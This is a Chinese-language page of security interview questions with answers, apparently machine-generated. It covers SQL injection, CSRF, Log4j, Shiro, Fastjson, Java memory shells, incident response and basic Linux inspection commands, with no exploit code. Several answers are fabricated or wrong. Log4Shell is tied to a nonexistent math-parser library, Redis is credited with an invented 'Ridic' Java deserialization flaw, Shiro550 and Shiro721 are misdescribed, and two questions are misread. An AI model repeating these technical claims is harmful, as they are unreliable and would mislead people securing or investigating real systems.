SQL 注入漏洞。</li><li>测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。</li><li>测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。</li></ol><p>总之，在测试一个登录框时，我们需要全面考虑各种安全问题，并进行针对性的测试，以确保应用程序的安全。</p><h2 id="csrf产生原因是什么"><a href="#csrf产生原因是什么" class="headerlink" title="csrf产生原因是什么"></a>csrf产生原因是什么</h2><p>CSRF（Cross-Site Request Forgery，跨站请求伪造）攻击是一种常见的 Web 安全漏洞，它利用用户在已登录的情况下访问恶意网站时，绕过同源策略，以用户身份执行未经授权的操作。</p><p>CSRF 攻击产生的原因主要有两个：</p><ol><li>Web 中的一些重要请求不合理地使用了 GET 方法：通常情况下，GET 方法用于获取资源，而 POST 方法用于提交数据。但是，在 Web 应用程序中，有时会把一些重要的请求用 GET 方法来实现，例如修改密码、转账等操作，这样容易被攻击者利用。</li><li>应用程序没有正确验证用户的来源：当应用程序接受到一个请求时，如果没有正确验证请求的来源是否合法，那么攻击者可以通过构造伪造的请求，以用户身份执行未经授权的操作。</li></ol><p>总之，要防止 CSRF 攻击，开发人员需要确保应用程序中所有的关键请求都使用 POST 方法，同时，还需要对请求进行适当的验证和授权，例如添加随机 token 或验证码等机制，以确保请求的来源是合法的。</p><h2 id="sql注入的种类"><a href="#sql注入的种类" class="headerlink" title="sql注入的种类"></a>sql注入的种类</h2><p>SQL注入是一种常见的Web应用程序攻击，攻击者通过执行恶意的SQL查询来窃取敏感信息、修改数据或者执行其他危害行为。根据攻击者的不同攻击手段和目的，SQL注入可以分为以下几种类型：</p><ol><li>基于错误的注入（Error-Based Injection）：该类型的 SQL 注入利用应用程序返回的错误信息来进行攻击，例如通过构造带有语法错误的查询来触发错误信息，攻击者可以从错误消息中获得关于数据库架构和数据的重要信息。</li><li>盲注注入（Blind Injection）：在盲注注入中，攻击者无法直接获取数据库返回的信息，因此需要通过其他方式来推断相关数据。例如，攻击者可以利用时间延迟等机制来判断是否成功注入恶意的SQL语句。</li><li>基于联合查询的注入（Union-Based Injection）：攻击者可以利用 UNION SELECT 语句将两个或多个结果集组合在一起，以获取额外的信息或绕过认证检查。攻击者通常会尝试通过添加 UNION SELECT 语句来向查询中添加恶意代码，例如向查询结果集中添加用户列表或密码信息。</li><li>基于布尔逻辑的注入（Boolean-Based Injection）：在这种类型的 SQL 注入中，攻击者会构造一个查询，该查询会返回一个布尔值，例如真或假。攻击者可以利用这些查询来推断数据库中的数据，例如使用 WHERE 子句构造一个布尔查询来检查某个字段是否存在。</li><li>时间延迟注入（Time-Based Injection）：在时间延迟注入中，攻击者通过向查询中添加时间延迟语句来判断查询是否成功执行。例如，攻击者可以使用 SLEEP() 函数来强制查询等待一段时间，在等待期间观察程序的响应时间来确定注入点是否存在。</li></ol><p>总之，在实际的 SQL 注入攻击中，攻击者通常会结合多种技术和手段，以达到其攻击目的。因此，开发人员需要采取适当的防御措施，例如输入验证、参数化查询、白名单过滤等，来避免 SQL 注入漏洞的出现。</p><h2 id="api环境下sql注入如何防御"><a href="#api环境下sql注入如何防御" class="headerlink" title="api环境下sql注入如何防御"></a>api环境下sql注入如何防御</h2><p>在 API 环境下，防止 SQL 注入攻击的方法和 Web 应用程序类似，主要包括以下几个方面：</p><ol><li>输入验证：开发人员需要对所有输入数据进行有效性验证，包括参数、请求体、请求头等。在验证输入时，可以使用正则表达式或白名单过滤等方法来确保输入数据的合法性。</li><li>参数化查询：在构造 SQL 查询语句时，需要使用参数化查询方式，而不是直接将输入数据拼接到 SQL 查询语句中。参数化查询可以使得 SQL 查询语句与输入数据分离，从而避免 SQL 注入漏洞的出现。</li><li>权限控制：开发人员需要对每个用户进行适当的身份认证和授权，以确保只有经过授权的用户才能访问敏感资源。在授权的过程中，还需要对用户所能访问的数据进行限制，例如使用视图或存储过程来限制用户的访问权限。</li><li>安全审计：监测应用程序的行为并记录日志，以便在发生异常情况时进行排查和调试。安全审计可以帮助开发人员及时发现潜在的漏洞和安全问题，并采取相应的措施加以修复。</li><li>定期更新：定期更新数据库软件及其组件，以确保应用程序使用的数据库软件版本是最新的，从而避免已知漏洞的利用。</li></ol><p>总之，在 API 环境下，开发人员需要采取多种措施来保护应用程序的安全，并避免 SQL 注入攻击的出现。同时，还应该定期进行安全审计和漏洞扫描，及时发现并修复安全问题。</p><h2 id="cs流量特征？"><a href="#cs流量特征？" class="headerlink" title="cs流量特征？"></a>cs流量特征？</h2><p>C/S（Client/Server，客户端/服务器）流量是指基于客户端和服务器之间的通信产生的网络流量。C/S 流量特征包括以下几个方面：</p><ol><li>会话建立：C/S 流量通常都需要进行会话建立，包括握手、协议版本交换、密钥协商等过程。在这个过程中，通常可以看到一些特定的协议字段和标志位。</li><li>数据传输：传输数据是 C/S 流量的主要特征之一。在这个过程中，通常可以看到明文或加密的数据传输，并且数据大小和传输速度也是分析流量的重要指标。</li><li>响应时间：C/S 流量通常包含请求和响应消息，因此可以通过分析请求和响应之间的时间差来判断系统性能和服务质量。</li><li>协议类型：C/S 流量涉及多种不同的协议类型，例如 HTTP、FTP、SMTP、POP3 等，每种协议的特点和流量特征也有所不同。</li><li>应用程序特点：C/S 流量还表现出应用程序的特点，例如应用程序的请求方式、请求频率、用户行为等等，这些特点对于分析和识别流量非常有帮助。</li></ol><p>总之，在分析 C/S 流量时，需要综合考虑多个方面的特征，并结合具体的应用程序和场景进行分析。同时，也需要使用适当的工具和技术，例如协议解码器、流量捕获工具等，来对流量进行捕获和分析。</p><h2 id="msf流量特征？"><a href="#msf流量特征？" class="headerlink" title="msf流量特征？"></a>msf流量特征？</h2><p>MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：</p><ol><li>目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。</li><li>异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。</li><li>频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。</li><li>数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。</li><li>特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。</li></ol><p>总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。</p><h2 id="动态链接库劫持应急响应应该怎么做"><a href="#动态链接库劫持应急响应应该怎么做" class="headerlink" title="动态链接库劫持应急响应应该怎么做"></a>动态链接库劫持应急响应应该怎么做</h2><p>动态链接库劫持（也称 DLL 劫持）是一种常见的攻击手段，攻击者通过将恶意 DLL 文件替换为合法的 DLL 文件，从而实现向操作系统注入恶意代码的目的。在发现动态链接库劫持时，应该采取以下措施进行应急响应：</p><ol><li>隔离受影响的系统：立即隔离受影响的系统，并从网络中断开，以避免进一步的攻击和传播。</li><li>恢复被劫持的 DLL 文件：找到被劫持的 DLL 文件，将其从系统中删除，并替换为原始的、正确的 DLL 文件。如果原始的 DLL 文件已经被篡改或删除，需要重新安装相应的软件或应用程序来获取正确的 DLL 文件。</li><li>检查并清除恶意代码：检查被劫持的 DLL 文件是否包含恶意代码，以及其他可能被感染的文件和系统组件。使用杀毒软件和反恶意软件等工具来清除恶意代码。</li><li>修改注册表：修改注册表，防止恶意 DLL 文件再次被加载。例如，可以修改 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs 键值，将所有可信 DLL 文件添加到其中。</li><li>加强安全措施：评估系统的安全性，并加强安全措施。例如，禁用不必要的服务和进程、添加访问控制列表、加密重要数据等。</li></ol><p>总之，在应对动态链接库劫持时，需要快速响应，并采取适当的措施进行恢复和防御，以保护系统和敏感数据的安全性。同时也需要加强监测和预防工作，对系统中的 DLL 文件进行定期检查，并实施安全审计和漏洞扫描等措施，避免类似攻击的再次出现。</p><h2 id="几台服务器在内网，其中一台被打穿，如何排查？"><a href="#几台服务器在内网，其中一台被打穿，如何排查？" class="headerlink" title="几台服务器在内网，其中一台被打穿，如何排查？"></a>几台服务器在内网，其中一台被打穿，如何排查？</h2><p>在一台服务器被攻破后，我们需要快速采取措施进行排查和修复，以下是一些可能的步骤：</p><ol><li>保留现场：在发现一台服务器遭到攻击后，首先要保持现场状态不变，尽量不要修改任何文件或日志。这可以帮助我们更好地了解攻击者的行为、恶意代码的传播路径以及其他可能受到影响的系统或数据。</li><li>收集证据：收集有关攻击的证据，例如入侵检测日志、应用程序日志、网络流量捕获等。这些证据可以帮助我们确定攻击的类型、攻击的时间以及攻击者所使用的工具和技术。</li><li>切断网络连接：为了防止恶意代码继续传播，需要切断受感染服务器与外部网络的连接。这可以通过拔掉网络电缆、关闭相关端口或禁用网络适配器等方法实现。</li><li>分析恶意代码：对受感染服务器上的恶意代码进行分析，以确定其行为、传播方式和危害程度。可以使用杀毒软件、反病毒软件或专业的样本分析工具来进行分析。</li><li>验证系统完整性：验证系统文件和配置是否被恶意代码篡改，例如检查系统文件的哈希值、比较配置文件的差异等。</li><li>进行漏洞扫描：对整个内网进行漏洞扫描，以确保其他服务器没有被攻击。可以使用专业的漏洞扫描工具来进行扫描，例如 Nessus、OpenVAS 等。</li><li>加强安全措施：根据攻击者的入侵方式和攻击的原因，加强系统和网络的安全措施，例如更新补丁、升级软件、增强防火墙规则等。</li></ol><p>总之，在排查一台服务器被攻击后，需要采取快速而有针对性的措施，并结合具体情况进行分析和修复，以保护系统和敏感数据的安全性。</p><h2 id="java内存马有哪几种？"><a href="#java内存马有哪几种？" class="headerlink" title="java内存马有哪几种？"></a>java内存马有哪几种？</h2><p>Java内存马是指一种恶意软件，通过利用Java虚拟机的特性，在目标机器上执行恶意代码，从而控制被感染的机器。以下是几种常见的Java内存马：</p><ol><li>基于反射的内存马：该类型的内存马通过Java反射机制动态加载字节码，绕过了Java程序的安全检查，可以在受害机器上执行任意代码。</li><li>基于Instrumentation的内存马：Instrumentation是Java提供的一组API，可以对正在运行的Java程序进行监控和修改。黑客可以利用这个机制来在目标机器上注入恶意代码。</li><li>基于ClassLoader的内存马：ClassLoader是Java中负责加载类的机制。黑客可以通过自定义ClassLoader来加载恶意代码，从而实现控制目标机器的目的。</li><li>基于JNI的内存马：JNI（Java Native Interface）是Java提供的一组API，可以在Java程序中调用本地代码。黑客可以编写本地代码，并将其作为DLL或SO文件加载到目标机器上，然后通过JNI接口与Java程序通信，从而实现控制目标机器的目的。</li></ol><p>需要注意的是，以上仅列举了部分常见的Java内存马，黑客也可能采用其他方式来实现内存马。为了保护系统的安全，建议及时更新Java版本，并加强对Java程序的安全审计。</p><h2 id="6379是什么端口？"><a href="#6379是什么端口？" class="headerlink" title="6379是什么端口？"></a>6379是什么端口？</h2><p>6379是Redis数据库的默认端口号。Redis是一种基于内存的键值存储系统，支持多种数据结构（如字符串、哈希表、列表等），并提供了丰富的操作命令（如读取、写入、删除等）。6379端口用于客户端与Redis服务器之间进行网络通信，通过这个端口，客户端可以连接到Redis服务器，并对其进行数据读写等操作。同时，6379端口也是黑客攻击Redis服务器的一个常见目标，因此在使用Redis时，需要注意设置好安全配置，保障Redis的安全性。</p><h2 id="7001是什么端口？"><a href="#7001是什么端口？" class="headerlink" title="7001是什么端口？"></a>7001是什么端口？</h2><p>7001是WebLogic服务器的默认管理端口。WebLogic是一种Java应用服务器，常用于企业级应用的开发和部署，其管理控制台可以通过7001端口进行访问和管理。除了管理控制台外，7001端口还用于WebLogic服务器的内部通信，如集群间的通信、容器间的通信等。需要注意的是，由于7001端口是WebLogic服务器的默认端口，因此可能会成为攻击者的攻击目标。在使用WebLogic时，应加强对系统的安全配置，如限制管理控制台的访问权限、设置防火墙规则等，以提高系统的安全性。</p><h2 id="设备上出现log4j，怎么判断攻击成功？"><a href="#设备上出现log4j，怎么判断攻击成功？" class="headerlink" title="设备上出现log4j，怎么判断攻击成功？"></a>设备上出现log4j，怎么判断攻击成功？</h2><p>如果在设备上出现了log4j，则说明攻击者可能利用Log4j漏洞进行攻击，此时可以通过以下方式判断是否真的发生了攻击：</p><ol><li>检查服务器日志：如果攻击成功，一般会在服务器日志中留下明显的痕迹，如未经授权的文件访问、操作系统命令执行等。建议定期检查服务器日志，尤其是涉及敏感数据和关键操作的日志。</li><li>检查网络流量：攻击者在远程操纵受害设备时，一般需要与设备进行网络通信，因此可以通过检查网络流量来判断是否有异常的数据传输行为。建议采用网络监控工具对网络流量进行实时监控，并对异常流量进行警报和记录。</li><li>检查系统进程：攻击者在利用漏洞进行攻击时，可能需要启动或修改一些系统进程，因此可以通过检查系统进程列表来寻找异常行为。建议使用系统监控工具对系统进程进行实时监控，并对异常进程进行警报和记录。</li></ol><p>需要注意的是，出现了Log4j并不意味着攻击一定已经成功，也可能只是正常业务应用中使用了Log4j功能。因此，在判断是否受到攻击时，应该综合考虑多种因素，并采取相应的安全措施。</p><h2 id="设备出现反序列化报警，怎么判断攻击成功？"><a href="#设备出现反序列化报警，怎么判断攻击成功？" class="headerlink" title="设备出现反序列化报警，怎么判断攻击成功？"></a>设备出现反序列化报警，怎么判断攻击成功？</h2><p>当一个设备出现反序列化报警时，可能意味着攻击者已经成功地利用了该设备上的漏洞，并通过发送恶意的数据包来触发该报警。为了判断攻击是否成功，您可以进行以下几个步骤：</p><ol><li>确认报警：首先，您需要确认该报警是否真实存在，而不是一次误报。请检查报警的详细信息，例如报警时间、报警源、报警类型等信息。</li><li>检查攻击路径：根据报警信息，您可以分析攻击者可能使用的攻击路径。例如，他们可能会尝试利用已知的漏洞或弱点来入侵系统，并在其中插入恶意代码。</li><li>搜索事件日志：搜索系统和应用程序的事件日志，以查找任何异常活动或不寻常的行为。您还可以查看系统资源的使用情况，例如CPU、内存和网络流量等，以帮助确定是否有恶意活动正在进行。</li><li>找出攻击者的IP地址：如果您能够找到攻击者的IP地址，请将其与已知的黑名单或威胁情报数据库进行比较，以确定该地址是否已被标记为恶意。</li><li>进行安全审计：最后，您可以进行安全审计以确定是否存在其他漏洞或弱点。这将帮助您修复当前的漏洞，并防止未来类似攻击的发生。</li></ol><p>在所有这些步骤中，最重要的是快速采取行动，以尽快确定并缓解攻击影响。</p><h2 id="fastion漏洞原理？"><a href="#fastion漏洞原理？" class="headerlink" title="fastion漏洞原理？"></a>fastion漏洞原理？</h2><p>“Fastjson” 是一种流行的 Java 序列化库，可用于将 Java 对象转换为 JSON 格式。然而，在 fastjson 序列化和反序列化的过程中，存在一些安全漏洞。其中一个漏洞就是针对 fastjson 反序列化的攻击。</p><p>fastjson 反序列化的攻击原理是通过精心构造的恶意JSON字符串，使得 fastjson 在反序列化时执行恶意代码。攻击者将恶意代码嵌入到JSON字符串中，并利用 fastjson 的某些特性来触发这些代码的执行。攻击者可能会使用这个漏洞来破坏应用程序的完整性、机密性和可用性等方面的保护措施。</p><p>具体来说，攻击者可能会在JSON字符串中添加一些特殊的快捷方式（shortcuts），例如 $ref 和 @type 等，以导致反序列化器创建新的对象实例并执行恶意代码。攻击者还可以利用fastjson中的某些漏洞，使其绕过安全检查，从而成功地执行恶意代码。</p><p>为了防止 fastjson 反序列化漏洞，开发人员需要采取一些预防措施。例如，他们应该避免直接将未经过验证的用户输入传递给 fastjson 反序列化器。开发人员还应该及时更新 fastjson 序列化库，以确保其安全性。此外，开发人员还可以使用其他序列化和反序列化库，例如Gson和Jackson等，来避免fastjson漏洞的风险。</p><h2 id="shiro漏洞原理？"><a href="#shiro漏洞原理？" class="headerlink" title="shiro漏洞原理？"></a>shiro漏洞原理？</h2><p>Apache Shiro是一个流行的Java安全框架，用于在应用程序中实现身份验证、授权和加密等功能。然而，Apache Shiro也存在一些安全漏洞，其中最著名的是反序列化漏洞。</p><p>Shiro反序列化漏洞的根本原因是，该框架采用了Java标准库中的ObjectInputStream类来反序列化请求中的数据。攻击者可以通过构造恶意请求，并将其发送到目标系统，以触发ObjectInputStream在处理该请求时执行恶意代码的情况。</p><p>攻击者可能会利用这个漏洞来绕过Shiro的安全控制，例如成功地进行认证并获得访问受保护资源的权限。攻击者还可以通过利用这个漏洞来在目标系统上执行任意代码，进一步危害系统的机密性和完整性。</p><p>为了缓解Shiro反序列化漏洞的风险，开发人员可以采取以下预防措施：</p><ol><li>避免直接从未经过验证的输入数据中反序列化对象。</li><li>限制反序列化器（如 ObjectInputStream）的使用，只反序列化可信来源的数据。</li><li>及时更新Shiro框架，以确保漏洞已被修复。</li><li>将Shiro部署在安全环境中，并使用网络隔离、网络监控和入侵检测等技术来加强安全控制。</li></ol><h2 id="log4j的漏洞原理？"><a href="#log4j的漏洞原理？" class="headerlink" title="log4j的漏洞原理？"></a>log4j的漏洞原理？</h2><p>Log4j是Java中广泛使用的一种日志管理工具，在许多应用程序中都被广泛使用。然而，最近发现了一种名为Log4Shell的漏洞，该漏洞使攻击者可以利用Log4j来执行任意代码，从而危及系统的安全性和完整性。以下是此漏洞的原理：</p><p>Log4j依赖于Apache Commons Math库中的一个子模块，即Math Expression Parser（MEP）库，以解析日志消息中的数学表达式。这个库使用了JNDI（Java命名和目录接口）技术，JNDI允许开发人员将Java对象绑定到命名空间中，以供其他Java应用程序使用。</p><p>攻击者可以通过构造特制的请求，将恶意的JNDI名称注入到Log4j中，从而诱骗Log4j调用该JNDI名称代表的对象，例如远程服务器上的恶意Java类。当Log4j尝试解析JNDI名称时，它会触发恶意JNDI资源的加载，并在其中执行恶意代码。</p><p>攻击者可以利用此漏洞来执行各种攻击，包括但不限于：</p><ol><li>远程代码执行：攻击者可以利用此漏洞在目标系统上执行任意代码，可能导致机密信息泄露、数据损坏和系统崩溃等问题。</li><li>远程命令执行：攻击者可以利用此漏洞在目标系统上执行任意命令，例如下载和安装恶意软件、创建后门访问等。</li></ol><p>为了缓解Log4j漏洞的风险，建议采取以下预防措施：</p><ol><li>更新Log4j版本：最新版本已经修复了此漏洞。</li><li>关闭JNDI：如果您不需要使用JNDI，建议禁用该功能。</li><li>阻止外部网络访问：对于架构设计合理的应用程序，应该使用网络隔离等技术来限制外部访问。这将有助于减轻远程攻击的风险。</li><li>加强应用程序安全性：开发人员应该定期审计和更新应用程序代码，以确保其安全性和完整性。</li></ol><h2 id="ridis漏洞原理？"><a href="#ridis漏洞原理？" class="headerlink" title="ridis漏洞原理？"></a>ridis漏洞原理？</h2><p>Redis是一个流行的开源内存数据存储系统，被广泛用于Web应用程序中的缓存、队列和消息传递等方面。然而，Redis也存在一些安全漏洞，其中最著名的是Ridic反序列化漏洞。</p><p>Ridic反序列化漏洞的根本原因是，Redis使用了Java标准库中的ObjectInputStream类来处理数据的序列化和反序列化。攻击者可以通过构造恶意请求，并将其发送到目标Redis服务器上，以触发ObjectInputStream在处理该数据时执行恶意代码的情况。</p><p>攻击者可能会利用这个漏洞来绕过Redis的身份验证、篡改或删除存储在Redis数据库中的数据，甚至在Redis服务器上执行任意代码。例如，攻击者可以使用此漏洞来：</p><ol><li>提升权限：攻击者可以通过远程执行任意代码进一步攻击目标系统，例如窃取敏感信息、破坏系统完整性、创建后门等。</li><li>篡改数据：攻击者可以修改Redis数据库中的数据，例如覆盖现有数据、添加新的键值对等。</li><li>删除数据：攻击者可以利用此漏洞删除Redis数据库中的数据，包括重要的配置文件、认证令牌等。</li></ol><p>为了缓解Ridic反序列化漏洞的风险，开发人员可以采取以下预防措施：</p><ol><li>不要直接将未经过验证的用户输入数据存储在Redis数据库中。</li><li>更新Redis版本以确保漏洞已修复。</li><li>配置Redis服务器的安全设置，例如限制网络访问和使用密码进行身份验证等。</li><li>启用日志记录并监测Redis服务器上的异常活动。</li><li>将Redis服务器部署在安全环境中，并定期对其进行安全审计。</li></ol><h2 id="shiro550和shiro721有什么区别"><a href="#shiro550和shiro721有什么区别" class="headerlink" title="shiro550和shiro721有什么区别?"></a>shiro550和shiro721有什么区别?</h2><p>Shiro550和Shiro721都是Apache Shiro框架中的安全漏洞，它们存在于不同的子模块中，并采用了不同的攻击方式。</p><p>Shiro550漏洞存在于Shiro-crypto模块中，是一种加密相关的漏洞。该漏洞使攻击者能够绕过Shiro的加密保护，从而访问受保护的资源。具体来说，攻击者可以将明文传递给加密方法，从而获得加密后的结果，然后利用这个结果来伪造受信任用户的身份。</p><p>与之相比，Shiro721漏洞则存在于Shiro-core模块中，是一种反序列化漏洞。该漏洞允许攻击者通过构造特制的序列化对象来执行任意代码，并在目标系统上实现远程代码执行攻击。攻击者可以通过向目标系统发送恶意请求触发此漏洞，并在其中嵌入恶意代码来破坏系统安全性和完整性。</p><p>总之，尽管Shiro550和Shiro721都是Shiro框架中的安全漏洞，但它们属于不同的类型和攻击方式。因此，在使用Shiro框架时，开发人员需要采取一些预防措施，并注意及时更新Shiro库中的漏洞修复。</p><h2 id="你对反序列化漏洞了解多少？"><a href="#你对反序列化漏洞了解多少？" class="headerlink" title="你对反序列化漏洞了解多少？"></a>你对反序列化漏洞了解多少？</h2><p>反序列化漏洞是指攻击者利用程序中未经充分验证的输入，向应用程序提供一个恶意构造的序列化对象，执行任意代码或获取敏感信息的漏洞。这种漏洞通常出现在Java和.NET等语言的应用程序中。</p><p>反序列化漏洞的本质是：当程序从存储介质读取对象时，如果没有对传入的数据进行充分验证，那么攻击者就可以通过精心构造的序列化对象，欺骗应用程序执行恶意代码。攻击者可能会在序列化对象中添加可执行代码或操作指令，以执行危害系统安全性和完整性的操作，例如修改或删除数据、窃取敏感信息或执行远程代码等。</p><p>为了防止反序列化漏洞，开发人员应该采取以下预防措施：</p><ol><li>避免直接将未经过验证的用户输入数据反序列化为对象。</li><li>对所有用户输入进行严格的验证和过滤，包括长度、格式和内容等方面。</li><li>限制反序列化器的使用，只反序列化可信来源的数据。</li><li>及时更新反序列化库，以确保已修复已知漏洞。</li><li>在系统上禁用危险的反序列化特性，例如使用Java标准库中的ObjectInputStream类。</li></ol><p>总之，反序列化漏洞是一种普遍存在的安全漏洞，需要开发人员特别注意，从设计、编码和测试等各个方面加强应用程序的安全性和完整性。</p><h2 id="linux查看端口，查看进程，查看恶意文件命令是什么？"><a href="#linux查看端口，查看进程，查看恶意文件命令是什么？" class="headerlink" title="linux查看端口，查看进程，查看恶意文件命令是什么？"></a>linux查看端口，查看进程，查看恶意文件命令是什么？</h2><ol><li>查看端口命令：</li></ol><p>在Linux中，可以使用以下命令来查看当前系统上打开的端口：</p><pre class="line-numbers language-none"><code class="language-none">netstat -tlnp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该命令列出了当前所有的TCP和UDP监听端口，并显示哪些程序正在使用这些端口。其中，“-t”表示只显示TCP协议，“-l”表示只显示监听端口，“-n”表示不解析IP地址和端口号，“-p”表示显示进程相关信息。</p><ol><li>查看进程命令：</li></ol><p>在Linux中，可以使用以下命令来查看当前正在运行的进程：</p><pre class="line-numbers language-none"><code class="language-none">ps -ef<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该命令列出了当前所有的进程，并显示每个进程的PID、名称、状态、父进程ID等信息。其中，“-e”表示列出所有进程，“-f”表示完整输出格式（包括用户、CPU占用率、内存占用等）。</p><ol><li>查看恶意文件命令：</li></ol><p>在Linux中，可以使用以下命令来查找可能的恶意文件：</p><pre class="line-numbers language-none"><code class="language-none">find / -name &lt;filename&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该命令将从根目录开始搜索指定文件名的文件，并输出所有匹配的结果。注意，此命令需要root权限才能搜索整个文件系统。</p><p>此外，还可以使用以下命令来查看特定文件是否具有可疑的权限或属性：</p><pre class="line-numbers language-none"><code class="language-none">ls -la &lt;filepath&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>该命令列出了特定文件的详细属性，包括所有者、组、权限、大小、修改时间和链接等信息。可以通过分析这些属性来确定文件是否具有可疑的行为。</p><h2 id="网站被攻击了怎么排查？"><a href="#网站被攻击了怎么排查？" class="headerlink" title="网站被攻击了怎么排查？"></a>网站被攻击了怎么排查？</h2><p>当网站被攻击时，开发人员应该采取以下步骤来排查：</p><ol><li>确认是否真的被攻击了：首先需要确认是否真的被攻击了。通常情况下，被攻击的网站可能会出现许多异常行为，例如页面加载缓慢、无法访问、误导用户等。此外，也可以通过日志分析和网络监测工具来探测是否存在异常流量或恶意请求。</li><li>初步分析攻击类型：根据异常行为和日志信息，可以初步确定攻击类型，例如SQL注入、XSS跨站脚本、CSRF跨站请求伪造、DDoS攻击等。</li><li>收集证据：对于发现的异常行为和攻击类型，需要收集相关证据，并记录下时间、来源、目标等信息，以便后续分析和响应。</li><li>及时阻止攻击：在收集完足够的证据后，应该尽快采取措施来阻止攻击的继续进行。可以使用防火墙、IP过滤、封禁IP地址等技术手段来限制攻击者的访问。</li><li>分析攻击原因：在阻止攻击后，需要深入分析攻击原因。可以从系统架构、代码实现、配置管理、人员行为等方面入手，找出漏洞和弱点，并及时修复。</li><li>恢复服务：在分析和修复所有漏洞后，需要恢复服务并重新上线网站。此时，可以使用安全工具和技术来加固系统，并建立监测系统来及时发现和响应类似攻击。</li></ol><p>总之，排查被攻击的网站是一个复杂而艰巨的过程，需要开发人员具有扎实的技能和丰富的经验。最重要的是，应该采取预防措施，在日常开发和运维中注重安全性和完整性，以防止未来的攻击。</p><h2 id="文件上传怎么通过设备判断？"><a href="#文件上传怎么通过设备判断？" class="headerlink" title="文件上传怎么通过设备判断？"></a>文件上传怎么通过设备判断？</h2><p>在文件上传功能中通过设备判断，通常可以使用HTTP请求头中的User-Agent字段来识别用户所使用的设备类型。该字段包含了用户代理软件的名称、版本号和操作系统等信息，可以根据这些信息来判断用户所使用的设备类型，例如PC、手机或平板电脑等。</p><p>以下是一些常见的User-Agent值，用于识别不同设备类型：</p><ul><li>PC端浏览器的User-Agent值通常包含“Windows”、“Macintosh”等关键字。</li><li>iOS设备的User-Agent值通常包含“iPhone”、“iPad”等关键字。</li><li>Android设备的User-Agent值通常包含“Android”等关键字。</li></ul><p>在服务器端代码中，可以通过解析HTTP请求头，提取User-Agent字段，并对其进行匹配和分类。例如，可以使用正则表达式来匹配User-Agent值，从而判断用户所使用的设备类型，并针对不同的设备类型做出相应的处理，例如限制上传的文件类型、大小等。</p><p>需要注意的是，User-Agent字段可能存在伪造或篡改的情况，因此不能完全依赖这个字段来确定用户的设备类型。在实现安全验证时，还需要采取其他措施，例如限制上传路径、禁止上传可执行文件、对上传文件进行文件类型检查、加强文件访问权限等，以增强上传功能的安全性和完整性。</p><h2 id="怎么排查内存马？"><a href="#怎么排查内存马？" class="headerlink" title="怎么排查内存马？"></a>怎么排查内存马？</h2><p>内存马是指恶意程序将自己注入到进程的内存中，从而实现对系统资源和数据的非法控制。由于内存马不占用磁盘空间，难以被杀毒软件检测和拦截，因此排查起来比较困难。但仍然可以采取以下一些方法来排查内存马：</p><ol><li>进程分析：通过查看系统中所有进程的信息，包括进程名称、PID、所属用户、内存占用等，可以尝试发现异常进程并排除其中是否存在内存马。</li><li>系统日志分析：通过分析系统日志文件，可以查看系统启动、服务开启、网络连接等活动，以了解是否有可疑的行为发生。</li><li>内存分析工具：使用专业的内存分析工具，例如Volatility Framework、Mandiant Memoryze、Rekall等，可以在内存中查找潜在的内存马代码或痕迹，并进行初步分析和定位。</li><li>网络监测工具：通过网络监测工具，例如Wireshark、Tcpdump等，可以捕获网络流量，了解是否有可疑的网络请求或通信行为，进一步定位内存马的来源和命令控制中心。</li><li>安全软件扫描：利用杀毒软件和安全扫描工具，例如Norton Power Eraser、Kaspersky TDSSKiller等，可以对系统进行全面的扫描和检测，以发现并清除可能存在的内存马。</li></ol><p>总之，排查内存马需要采取多种方法、综合分析，结合实际情况而定。在预防内存马时，还需要加强系统的安全性和完整性，限制对系统资源和文件的访问权限，禁止不必要的外部连接和通信行为，及时更新系统和应用程序的补丁和版本，从源头上避免内存马的出现。</p><h2 id="登录框页面都可以测试哪些漏洞？"><a href="#登录框页面都可以测试哪些漏洞？" class="headerlink" title="登录框页面都可以测试哪些漏洞？"></a>登录框页面都可以测试哪些漏洞？</h2><p>登录框页面是Web应用程序中常见的功能之一，也是黑客攻击的重要目标。下面列举了一些可能存在的漏洞：</p><ol><li>SQL注入：黑客可以在登录框中输入特殊字符，从而构造恶意的SQL语句，绕过身份验证，甚至获取敏感信息。</li><li>XSS跨站脚本攻击：黑客可以通过在登录框中插入JavaScript代码，篡改页面内容或窃取用户凭据等。</li><li>CSRF跨站请求伪造：黑客可以通过构造恶意请求，在用户不知情的情况下发起伪造的登陆请求，从而模拟合法用户的身份完成相应操作。</li><li>密码弱口令：用户设置的密码太简单或者容易被猜到，导致黑客可以轻松破解，进而访问网站的系统资源和数据。</li><li>会话固定攻击：黑客可以通过截获会话ID，让其他用户使用这个会话ID来登录，从而获取用户的敏感信息。</li><li>身份验证绕过：黑客可以通过各种手段，如暴力破解、抓包分析等方式，绕过身份验证机制，进而访问系统资源和数据。</li><li>命令注入：黑客可以在用户名或密码中注入恶意的命令，从而执行系统命令，控制服务器。</li></ol><p>为了有效地防范这些漏洞，开发人员应该采取一些预防措施，例如加强用户输入的验证和过滤、使用安全的密码策略、使用CSRF 